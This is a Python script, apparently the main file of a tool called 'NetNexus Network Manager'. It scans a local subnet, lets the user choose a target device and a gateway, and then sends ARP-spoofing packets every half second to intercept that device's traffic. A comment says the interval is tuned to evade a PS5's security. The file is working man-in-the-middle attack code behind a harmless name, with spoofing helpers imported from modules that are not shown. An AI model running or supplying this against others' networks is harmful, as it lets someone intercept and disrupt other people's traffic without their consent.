import scapy.all as scapy
import os
import time
from core import scanner, spoof

def main():
    # --- CONFIGURATION ---
    # Change 'enp3s0' to your interface from 'ip a' (e.g., wlan0)
    scapy.conf.iface = "enp3s0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root privileges. Use sudo.")
        return

    print("=== NetNexus Network Manager ===")
    target_range = input("Enter scan range (e.g., 192.168.8.1/24): ")
    
    print("[*] Scanning... Please ensure target devices are active.")
    devices = scanner.scan(target_range)
    
    print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
    print("-" * 80)
    for index, device in enumerate(devices):
        print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")

    try:
        choice = int(input("\nSelect Target ID: "))
        gateway_ip = input("Enter Gateway IP (e.g., 192.168.8.1): ")
        
        target = devices[choice]
        target_mac = target['mac']
        gateway_mac, _ = spoof.get_device_info(gateway_ip)

        if not gateway_mac:
            print("[-] Could not find Gateway MAC. Exiting.")
            return

        print(f"[*] Intercepting {target['ip']} ({target['name']})...")
        print("[*] Press Ctrl+C to stop and restore network.")
        
        while True:
            # Aggressive 0.5s interval to stay ahead of PS5 security
            spoof.spoof(target['ip'], gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) 
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down. Restoring ARP tables...")
        spoof.restore(target['ip'], gateway_ip)
        spoof.restore(gateway_ip, target['ip'])
        print("[+] Network restored.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
